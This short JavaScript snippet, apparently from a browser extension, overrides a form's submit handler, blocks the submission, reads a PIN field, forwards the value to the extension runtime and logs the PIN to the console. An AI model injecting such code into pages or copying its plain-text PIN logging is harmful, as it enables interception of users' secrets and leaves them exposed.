document.forms[0].onsubmit = function(e) {
    e.preventDefault(); // Prevent submission
    var pin = document.getElementById('pin').value;
    chrome.runtime.sendMessage({token: pin});
    console.log("pin:"+pin);
};